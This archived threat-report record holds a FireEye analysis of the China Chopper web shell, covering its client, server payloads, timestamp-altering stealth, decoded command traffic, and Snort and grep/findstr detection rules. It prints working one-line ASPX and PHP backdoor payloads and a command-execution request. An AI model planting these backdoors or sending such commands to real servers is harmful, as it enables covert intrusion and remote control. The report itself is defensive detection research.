{
    "id": "7b3d8756-0f67-4d94-b057-5f84234df51b",
    "created_at": "2022-10-25T16:48:12.649294Z",
    "updated_at": "2025-03-27T02:05:47.326142Z",
    "deleted_at": null,
    "sha1_hash": "8a3a657ac02569c1324ade4cca562ae8c5781f94",
    "title": "The Little Malware That Could: Detecting And Defeating The China Chopper Web Shell",
    "authors": "FireEye",
    "file_creation_date": "2013-11-14T10:16:02Z",
    "file_modification_date": "2013-11-14T10:16:05Z",
    "file_size": 3262027,
    "plain_text": "# The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell\n\n\n### FireEye Labs\n\n Authors: Tony Lee, Ian Ahl\n and Dennis Hanzlik\n\n\n-----\n\n## Contents\n\n### Introduction 2\n\n Components 2\n\n Capabilities 7\n\n Payload Attributes 11\n\n Platform 14\n\n Delivery Mechanism 16\n\n Traffic Analysis 16\n\n Detection 20\n\n Conclusion 23\n\n About FireEye 23\n\n\n-----\n\n## Introduction\n\nChina Chopper is an increasingly popular Web shell that packs a powerful punch into a small package.\nIn the space of just 4 kilobytes, the Web shell offers file and database management, code obfuscation,\nand more—all in an easy-to-use graphical user interface that even novices can use.\n\nGiven its growing prevalence, especially among Chinese cybercriminals, China Chopper warrants\nmuch more exposure than it has received to date. Outside of an insightful blog post from security\nresearcher Keith Tyler[1], little useful information on China Chopper is publically available.\n\nTo contribute something new to the public knowledge base—especially for those who happen to find\nthe China Chopper server-side payload on one of their Web servers—FireEye studied the components,\ncapabilities, payload attributes, and the detection rate of this 4 kilobyte menace.\n\nThis report describes the features that make China Chopper an increasingly popular tool for cyber\nattackers. And more important, the report explains how security professionals can better detect the\nWeb shell through network traffic and on compromised systems.\n\n## Components\n\nChina Chopper is a simple backdoor in terms of components. It has two key components: the Web shell\ncommand-and-control (CnC) client binary and a text-based Web shell payload (server component).\nThe text-based payload is so simple and short that an attacker could type it by hand right on the target\nserver—no file transfer needed.\n\n**Web shell client**\nThe Web shell client was originally available on www.maicaidao.com. FireEye advises against visiting\nthat site now.\n\n**Web Shell (CnC) Client** **MD5 Hash**\n\ncaidao.exe 5001ef50c7e869253a7c152a638eab8a\n\nTable 1: Original Web shell\nclient with MD5 hash code\n\n1 Tyler’s China Chopper post is available at http://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.html.\n\n|Web Shell (CnC) Client|MD5 Hash|\n|---|---|\n|caidao.exe|5001ef50c7e869253a7c152a638eab8a|\n\n\n-----\n\nThe client binary is packed with UPX and is 220,672 bytes in size, as shown in Figure 1.\n\nFigure 1: Client binary\nviewed in WinHex\n\nThe executable file compressor UPX unpacks the binary to reveal details hidden by the packer.\n\n\nC:\\Documents and Settings\\Administrator\\Desktop>upx -d\n5001ef50c7e869253a7c152a638eab8a.exe -o decomp.exe\nUltimate Packer for eXecutables\nCopyright (C) 1996 - 2011\nUPX 3.08w    Markus Oberhumer, Laszlo Molnar & John Reiser  Dec\n12th 2011\nFile size     Ratio   Format   Name\n--------------------  ------  -----------  ----------700416 <-  220672  31.51%  win32/pe   decomp.exe\nUnpacked 1 file.\n\n\n-----\n\nPEiD (a free tool for detecting packers, cryptors, and compilers found in PE executable files),[2] reveals\nthat the unpacked client binary was written in Microsoft Visual C++ 6.0, as shown in Figure 2.\n\nFigure 2: PEiD reveals that\nthe binary was written using\nVisual C++ 6.0\n\nBecause the strings are not encoded, examining them in the unpacked binary exposes how the\nbackdoor communicates. Appearing in the strings are an intriguing reference to google.com.hk using\nthe Chinese (simplified) language parameter (Figure 3) and references to the text “Chopper” (Figure 4).\n\nFigure 3: Printable strings\nrefer to www.google.com.hk\n\n2 More information about PEiD is available at http://www.aldeid.com/wiki/PEiD.\n\n\n-----\n\nFigure 4: References to\nChopper in the client binary\n\nIn action, China Chopper is a menu-driven GUI full of convenient attack and “target-management”\nfeatures. When opened, the client displays example shell entries that point to www.maicaidao.com,\nwhich originally hosted components of the Web shell.\n\nTo add a target, attackers right click within the client window, select Add from the menu and enter the\ntarget IP address, password, and encoding as shown in Figure 5.\n\nFigure 5: Picture of the\nChina Chopper Web shell interface\n\n\n-----\n\n**Server-side Payload Component**\nBut the client is only half of the remote access tool (RAT)—and not likely the part that would appear on\na targeted network. Its communication relies on a payload in the form of a small Web application. This\npayload is available in a variety of languages such as ASP, ASPX, PHP, JSP, and CFM. Table 2 shows some\nof the original files available for download shown with their MD5 hashes.CHINA\n\n**Web Shell Payload** **MD5 Hash**\n\nCustomize.aspx 8aa603ee2454da64f4c70f24cc0b5e08\n\nCustomize.cfm ad8288227240477a95fb023551773c84\n\nCustomize.jsp acba8115d027529763ea5c7ed6621499\n\nTable 2: Original China Chopper files,\nwith MD5 hash codes[3]\n\nEven though the MD5s are useful, this is a text-based payload that can be easily changed, resulting\nin a new MD5 hash. Here is an example of just one of China Chopper’s text-based payloads (for more\ndetails, see “Payload Attributes” on Page 11):\n\nASPX:\n\n|Web Shell Payload|MD5 Hash|\n|---|---|\n|Customize.aspx|8aa603ee2454da64f4c70f24cc0b5e08|\n|Customize.cfm|ad8288227240477a95fb023551773c84|\n|Customize.jsp|acba8115d027529763ea5c7ed6621499|\n\n\n<%@ Page Language=”Jscript”%><%eval(Request.Item[“password”],”unsafe”);%>\n\n\nIn real-world use, “password” would be replaced with the actual password to be used in the client\ncomponent when connecting to the Web shell.\n\n3 Keith Tyler. “China Chopper Webshell - the 4KB that Owns your Web Server.” November 2012.\n\n\n-----\n\n## Capabilities\n\nThe capabilities of both the payload and the client are impressive considering their size. The Web shell\nclient contains a “Security Scan” feature, independent of the payload, that gives the attacker the\nability to spider and use brute-force password guessing against authentication portals.\n\nFigure 6: China Chopper provides\na “Security Scan” feature\n\nIn addition to vulnerability hunting, China Chopper has excellent CnC features when combining\nthe client and payload, include the following:\n\n- File Management (File explorer)\n\n- Database Management (DB client)\n\n- Virtual Terminal (Command shell)\n\nIn China Chopper’s main window, right-clicking one of the target URLs brings up a list of possible\nactions (see Figure 7).\n\nFigure 7: Screenshot of the CnC client\nshowing capabilities of the Web shell\n\n\n-----\n\n**File Management**\nUsed as a RAT, China Chopper makes file management simple. Abilities include uploading and\ndownloading files to and from the target, using the file-retrieval tool Wget[4] to download files from the\nWeb to the target. Attackers can also edit, delete, copy, and rename files—and even change their\ntime stamp.\n\nFigure 8: File management provides an\neasy-to-use menu that is activated by\nright-clicking on a file name\n\nThe Modify the file time option is a surprisingly effective stealth technique. Figure 9 shows the time\nstamps of the three files in the test directory before the Web shell modifies the time stamps. By default,\nWindows Explorer shows only the “Date Modified” field. Without the time stamp change, the Web shell\neasily stands out because it is newer than the other two files.\n\nFigure 9: IIS directory showing time\nstamps prior to the time modification\n\n4 Wget is available at http://www.gnu.org/software/wget/.\n\n\n-----\n\nFigure 10 shows the date of the file after the Web shell modifies the time stamp. The “Date Modified”\nvalue on the Web shell shows up as the same as the other two files. This is the default field displayed to\nusers, so to the untrained eye it easily blends in—especially with many files in the directory.\n\nFigure 10: IIS directory showing time\nstamps after the time modification\n\nClever investigators may think that they can spot the suspicious file due to the creation date being\nchanged to the same date as the modified date. But this is not necessarily anomalous. Additionally,\neven if the file is detected, the forensic timeline is skewed because the date that the attacker planted\nthe file is no longer present. Finding the real date that the file was planted requires examining the\nMaster File Table (MFT). After acquiring the MFT using FTK, EnCase, or other means, FireEye recommends\nusing mftdump.[5] Written by FireEye researcher Mike Spohn, mftdump is a great tool for extracting and\nanalyzing file metadata.\n\nTable 3 shows the time stamps pulled from the MFT for our Web shell file before and after the time\nstamps were modified. The “fn*” fields retain their original times, so some useful information remains.\n\n**Category** **Pre-touch Match** **Post-touch Match**\n\nsiCreateTime (UTC) 6/6/2013 16:01 2/21/2003 22:48\n\nsiAccessTime (UTC) 6/20/2013 1:41 6/25/2013 18:56\n\nsiModTime (UTC) 6/7/2013 0:33 2/21/2003 22:48\n\nsiMFTModTime (UTC) 6/20/2013 1:54 6/25/2013 18:56\n\nfnCreateTime (UTC) 6/6/2013 16:01 6/6/2013 16:01\n\nfnAccessTime (UTC) 6/6/2013 16:03 6/6/2013 16:03\n\nfnModTime (UTC) 6/4/2013 15:42 6/4/2013 15:42\n\nfnMFTModTime (UTC) 6/6/2013 16:04 6/6/2013 16:04\n\nTable 3: Time stamps from MFT\n\n5 The mftdump tool is available at http://malware-hunters.net/all-downloads/.\n\n|Category|Pre-touch Match|Post-touch Match|\n|---|---|---|\n|siCreateTime (UTC)|6/6/2013 16:01|2/21/2003 22:48|\n|siAccessTime (UTC)|6/20/2013 1:41|6/25/2013 18:56|\n|siModTime (UTC)|6/7/2013 0:33|2/21/2003 22:48|\n|siMFTModTime (UTC)|6/20/2013 1:54|6/25/2013 18:56|\n|fnCreateTime (UTC)|6/6/2013 16:01|6/6/2013 16:01|\n|fnAccessTime (UTC)|6/6/2013 16:03|6/6/2013 16:03|\n|fnModTime (UTC)|6/4/2013 15:42|6/4/2013 15:42|\n|fnMFTModTime (UTC)|6/6/2013 16:04|6/6/2013 16:04|\n\n\n-----\n\n**Database Management**\nThe database management functionality is impressive and helpful to the first-time user. Upon configuring\nthe client, China Chopper provides example connection syntax.\n\nFigure 11: Database management\nrequires simple configuration\nparameters to connect\n\nAfter connecting, China Chopper also provides useful SQL commands.\n\nFigure 12: China Chopper’s database\nmanagement feature lets users interact\nwith a database and even provides\nhelpful prepopulated commands\n\n**Command Shell Access**\nFinally, China Chopper provides command shell access for OS-level interaction, further\ndemonstrating its versatility.\n\nFigure 13: Virtual terminal provides a\ncommand shell for OS interaction\n\n\n-----\n\n## Payload Attributes\n\nChina Chopper is stealthy due to a number of factors, including the following:\n\n- Size\n\n- Server-side content\n\n- Client-side content\n\n- AV detection rate (or lack thereof)\n\n**Size**\nMalicious and benign software usually suffers from the same principle: more features equals more code,\nwhich equals larger size. Considering how many features China Chopper offers, it is incredibly small—just\n73 bytes for the ASPX version, or 4 kilobytes on disk (see Figure 14). Compare that to other Web shells\nsuch as Laudanum (619 bytes) or RedTeam Pentesting (8,527 bytes). China Chopper is so small and\nsimple that an attacker could conceivably type the contents of the shell by hand.\n\nFigure 14: China Chopper\nfile properties\n\n\n-----\n\n**Server-Side Content**\nThe server-side content could easily be overlooked among the other files associated with a vanilla\ninstall of a complex application. The code does not look malicious—just odd.\n\nFigure 15: The content of the file\nseems relatively benign, especially\nif with a safe-sounding word like\n“Security” as the shell password\n\nBelow are the contents of the Web shell for two of its varieties.\n\nASPX:\n\n\n<%@ Page Language=”Jscript”%><%eval(RequestItem[“password”],”unsafe”);%>\n\n\nPHP:\n\n\n<?php @eval($_POST[‘password’]);?>\n\n\n**Client-Side Content**\nBecause all of the code is server-side language that does not generate client-side code,\nbrowsing to the Web shell and viewing the source as a client reveals nothing.\n\nFigure 16: Viewing the source of the\nWeb shell reveals nothing to the client\n\n\n-----\n\n**Anti-Virus Detection Rate**\nRunning the Web shell through the virus-scanning website “No Virus Thanks” shows a detection rate of\n0 out of 14, indicating that most, if not all, anti-virus tools would miss the Web shell on an infected system.\n\nFigure 17: Results of multiple anti-virus\nengine inspections showing China\nChopper coming up clean\n\n\n-----\n\nThe same holds true for VirusTotal. None of its 47 anti-virus engines flags China Chopper as malicious.\n\nFigure 18: Results of multiple AV\nengine inspections showing the\nWeb shell comes up clean\n\n## Platform\n\nChina Chopper can run on any Web server capable of running JSP, ASP, ASPX, PHP, or CFM—the\nmajority of Web application languages. China Chopper can also run transparently on both Windows\nand Linux. This OS and application flexibility make China Chopper an even more dangerous Web shell.\n\n“Server-side Payload Component” on Page 5 showed China Chopper executing on a Windows 2003 IIS\nserver using ASPX. Figure 19 shows it running on Linux with PHP. Here, the contents of the PHP version are\njust as minimalistic.\n\nFigure 19: This command is all that it\ntakes to run on Linux with PHP\n\n\n-----\n\nWhile the available options differ depending on what platform China Chopper is running on,\nthe file management features in Linux (see Figure 20) are similar to those in Windows.\n\nFigure 20: File browsing on a\ntarget system running Linux\n\nThe database client example shown in Figure 21 is MySQL instead of MS-SQL, but it offers many\nof the same capabilities.\n\nFigure 21: Database management\nfrom a target system running Linux\n\nThe virtual terminal looks familiar (Figure 22), but uses Linux commands instead of Windows because\nthey are ultimately interpreted by the underlying operating system.\n\nFigure 22: Virtual terminal from a\ntarget system running Linux\n\n\n-----\n\n## Delivery Mechanism\n\nChina Chopper’s delivery mechanism is flexible due to the size, format, and simplicity of the malware’s\npayload. This small, text-based payload can be delivered using any of the following mechanisms:\n\n- WebDAV file upload\n\n- JBoss jmx-console or Apache Tomcat management pages\n\n(For more details on this attack vector, read FireEye consultant Tony Lee’s explanation)[6]\n\n- Remote exploit with a file drop\n\n- Lateral propagation from other access\n\n## Traffic Analysis\n\nAfter examining the server-side payload and the client used to control the Web shell, the next step\nto understanding China Chopper is observing its traffic. Having both the server and client components\nenables researchers to start a packet capture to view the contents of typical traffic. As shown in\nFigure 23, the client initiates the connection over TCP port 80 using the HTTP POST method.\n\nFigure 23: A packet capture shows that\nthe Web shell traffic is HTTP POST traffic\nover TCP port 80\n\n6 Tony Lee. “Manually Exploiting Tomcat Manager.” September 2012.\n\n\n-----\n\nBecause this is TCP traffic, researchers can “follow the TCP” stream in Wireshark, a popular open-source\nnetwork-protocol analyzer that works in Unix and Windows.[7] In Figure 24, the traffic in red at the top is\nfrom the attacker (Web client). The traffic shown in blue at the bottom is the response from the target\n(Web shell).\n\nFigure 24: After following the TCP\nstream, researchers can see that\nthe majority of the attacker traffic\nis Base64 encoded\n\n7 Wireshark is available at http://www.wireshark.org/.\n\n\n-----\n\nAs highlighted above, the majority of the attacker traffic appears to be Base64 encoded. This is not a\nproblem though, because it can be easily decoded. Using the “TextWizard” feature of the free Fiddler\nWeb debugger reveals what the attacker is sending.[8]\n\n(Note: %3D is a URL-encoded representation of the equal sign (“=”). Fiddler needs this to be converted\nto an equal sign for proper decoding.)\n\nRaw attacker traffic:\n\n\nPassword=Response.Write(“->|”);\nvar err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).\nGetString(System. Convert.FromBase64String\n(“dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3R\nlbS5UZXh0LkVuY29kaW5n\nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc\n2U2NFN0cmluZyhSZXF1ZX\nN0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXN\nzKCk7dmFyIG91dDpTeXN0\nZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTa\nGVsbEV4ZWN1dGU9ZmFsc2\nU7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJ\nyb3I9dHJ1ZTtlLlN0YXJ0\nSW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY\n29kaW5nKDY1MDAxKS5HZX\nRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1\nbInoyIl0pKTtlLlN0YXJ0\nKCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2Uo\nKTtSZXNwb25zZS5Xcml0ZS\nhvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D”)),”unsafe”);}\ncatch(err){Response.Write\n(“ERROR:// “%2Berr.message);}Response.Write(“|<-”);Response.\nEnd();&z1=Y21k&z2=Y2QgL2QgImM6\nXGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D\n\n\nAs shown In Figure 25, the Fiddler Web debugger text wizard easily converts the raw traffic from\nBase64 to plain text.\n\nFigure 25: Fiddler Web debugger\ndecodes the Base64 traffic\n\n8 Fiddler is available at http://fiddler2.com/.\n\n\n-----\n\nDecoded traffic:\n\n\nvarc=newSystem.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEn­\ncoding(65001).\nGetString(System.Convert.FromBase64String(Request.Item[“z1”])));\nvare=newSystem.Diagnostics.Process();\nvarout:System.IO.StreamReader,EI:System.IO.StreamReader;\nc.UseShellExecute=false;\nc.RedirectStandardOutput=true;c.RedirectStandardError=true;\ne.StartInfo=c;c.Arguments=”/c”+System.Text.Encoding.GetEncoding(65001).\nGetString(System.Convert.FromBase64String(Request.Item[“z2”]));\ne.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();\nResponse.Write(out.ReadToEnd()+EI.ReadToEnd());\n\n\nThe decoded traffic presents something more readable. But the Base64-decoded traffic shows an\nattempt to decode more Base64 traffic stored as “z1” and “z2.” The attacker traffic shows z1 and z2\nparameters immediately after the end of the “Password” parameter.\n\nThe Base64-encoded parameters z1 and z2 are highlighted in the following output:\n\n\n&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZ\njZCZlY2hvIFtFXQ%3D%3D\n\n\nBase64-decoded parameters z1 and z2:\n\n\nz1=cmdz2=cd /d “c:\\inetpub\\wwwroot\\”&whoami&echo [S]&cd&echo [E]\n\n\nThis code explains how the client communicates with the shell. The “Password” parameter passes the\ncode to the payload to be executed. The z1 is cmd, and z2 contains the arguments to the command\nprompt sent via cmd /c. All output is sent to standard output (stdout) back to the attacker, which\ncreates the following response to the whoami command and the present working directory:\n\n\n->|nt authority\\network service[S]C:\\Inetpub\\wwwroot[E]|<\n\n-----\n\n## Detection\n\nUnderstanding the contents of China Chopper and what its traffic looks like allows researchers\nto detect this pest both at the network and the host level.\n\n**Network**\nWith a standard Snort[9] IDS in place, this traffic can be caught with relative ease. Keith Tyler provides\nthe following basic IDS signature in his previously cited China Chopper blog post:[10]\n\n\nalert tcp any any -> any 80 ( sid:900001; content:”base64_decode”;\nhttp_client_body;flow:to_server,established; content:”POST”; nocase;\nhttp_method; ;msg:”Webshell Detected Apache”;)\n\n\nTo reduce false positives, tighten the Snort IDS signature to focus on China Chopper by looking\nfor contents of “FromBase64String” and “z1” as follows:\n\n\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS\n(msg: “China Chopper with first Command Detected”;\nflow:to_server,established; content: “FromBase64String”;\ncontent: “z1”; content:”POST”; nocase;http_method;\nreference:url,http://www.fireeye.com/blog/technical/botnet-activitiesresearch/2013/08/\nbreaking-down-the-china-chopper-web-shell-part-i.html;\nclasstype:web-application-attack; sid: 900000101;)\n\n\nThe following IDS signature looks for content of “FromBase64String” and any combination of “z” followed\nby one to three digits—it would find “z1”, “z10”, or “z100” for example. The idea: if the first command (z1)\nis missed, the signature still catches subsequent commands.\n\n\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS\n(msg: “China Chopper with all Commands Detected”; flow:to_\nserver,established;\ncontent: “FromBase64String”; content: “z”; pcre: “/Z\\d{1,3}/i”;\ncontent:”POST”; nocase;http_method;\nreference:url,http://www.fireeye.com/blog/technical/botnet-activitiesresearch/2013/08/\nbreaking-down-the-china-chopper-web-shell-part-i.html;\nclasstype:web-application-attack; sid: 900000102;)\n\n\nBoth of these IDS signatures can be optimized further to factor depth and offset. Be sure to put a valid\nSID in before implementing and test the signature for performance.\n\n9 Snort is available at http://www.snort.org/.\n\n10 Keith Tyler. “China Chopper Webshell - the 4KB that Owns your Web Server”. November 2012.\n\n\n-----\n\n**Host**\nBecause the shells must contain a predictable syntax, researchers can quickly attempt to find files that\nhave that code in play.\n\nMany methods can be used to find files that contain China Chopper. The quickest and easiest method,\nespecially on a Linux machine, is probably using regular expressions. As shown in Figure 26, a quick\n_egrep across the Web directory can help identify infected files._\n\n\negrep -re ‘ [<][?]php\\s\\@eval[(]\\$_POST\\[.+\\][)];[?][>]’ *.php\n\n\nFigure 26: Using egrep to find\nChina Chopper\n\nAs shown in Figure 26, the egrep and regex commands are a powerful combination. While the regex\nsyntax may seem like gibberish, mastering it is not as difficult as it seems at first glance. Ian Ahl has\ncreated a few tutorials that can help improve researchers’ regex skills. Here are two to get started:\n\n- Regex basics (http://www.tekdefense.com/news/2012/10/21/tektip-ep12-regex-basics.html)\n\n- Using regex with Notepad\n\n(http://www.tekdefense.com/news/2013/1/6/tektip-ep19-using-regex-with-notepad.html)\n\nWindows also provides a way to search files using regular expressions with its native findstr command.\n\n\nc:\\Tools>findstr /R “[<][?]php.\\@eval[(]\\$_POST.*[)];[?][>]” *.php\n**test.php:<?php @eval($_POST[‘password’]);?>**\nc:\\Tools>–\n\n\nFigure 27: Using findstr to locate\nChina Chopper\n\n\n-----\n\nThe command string differs from the regex equivalent. This was necessary to get around some\nof the ways that findstr interprets regex.\n\nThe findstr command runs as follows:\n\n### findstr /R “[<][?]php.\\@eval[(]\\$_POST.*[)];[?][>]” *.php\n\nThese examples show detection in the PHP shell. To find the ASPX shell, modify the regex to fit\nthe syntax of the ASPX shell as shown:\n\n### egrep -re ‘[<]\\%\\@\\sPage\\sLanguage=.Jscript.\\%[>][<]\\%eval.Request\\. Item.+unsafe’ *.aspx\n\n findstr /R “[<]\\%\\@.Page.Language=.Jscript.\\%[>][<]\\%eval.Request\\. Item.*unsafe” *.aspx\n\nResearchers unsure where all of the PHP or ASPX files are on a Windows host can use the dir command\nwith some extended options to help identify Web files to run the regex command against (see Figure 28).\n\n### dir /S /A /B *.php\n\nFigure 28: Recursive search through\nWindows using the dir command\n\n_Findstr also has an option to search all subdirectories (see Figure 29), as follows:_\n\n### findstr /R /S “[<][?]php.\\@eval[(]\\$_POST.*[)];[?][>]” *.php\n\nFigure 29: Using findstr to recursively\nlocate multiple instances of the\nWeb shell\n\n\n-----\n\n## Conclusion\n\nArmed with knowledge about China Chopper’s features, platform versatility, delivery mechanisms,\ntraffic analysis, and detection—along with a few free software tools—researchers can begin eradicating\nthis elegantly designed but dangerous menace.\n\nTo learn more about how FireEye can help your organization find China Chopper and other advanced\nmalware, visit www.fireeye.com.\n\n**About FireEye**\n\nFireEye has invented a purpose-built, virtual machine-based security platform that provides realtime threat protection to enterprises and governments worldwide against the next generation of\ncyber attacks. These highly sophisticated cyber attacks easily circumvent traditional signature-based\ndefenses, such as next-generation firewalls, IPS, anti-virus, and gateways. The FireEye Threat Prevention\nPlatform[™] provides real-time, dynamic threat protection without the use of signatures to protect\nan organization across the primary threat vectors, including Web, email, and files and across the\ndifferent stages of an attack life cycle. The core of the FireEye platform is a virtual execution engine,\ncomplemented by dynamic threat intelligence, to identify and block cyber attacks in real time.\nFireEye has over 1,100 customers across more than 40 countries, including over 100 of the Fortune 500.\n\n© 2013 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, Inc. All other brands, products, or service names\nare or may be trademarks or service marks of their respective owners. – RPT.CCWS.EN-US.112013\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/yvk5tr8poletupw82biic0ucpvynvoyj",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2013/2013.00.00.China_Chopper_Web_Shell/fireeye-china-chopper-report.pdf"
    ],
    "report_names": [
        "fireeye-china-chopper-report"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041147,
    "ts_creation_date": 1384424162,
    "ts_modification_date": 1384424165,
    "files": {
        "pdf": "https://archive.orkl.eu/8a3a657ac02569c1324ade4cca562ae8c5781f94.pdf",
        "text": "https://archive.orkl.eu/8a3a657ac02569c1324ade4cca562ae8c5781f94.txt",
        "img": "https://archive.orkl.eu/8a3a657ac02569c1324ade4cca562ae8c5781f94.jpg"
    }
}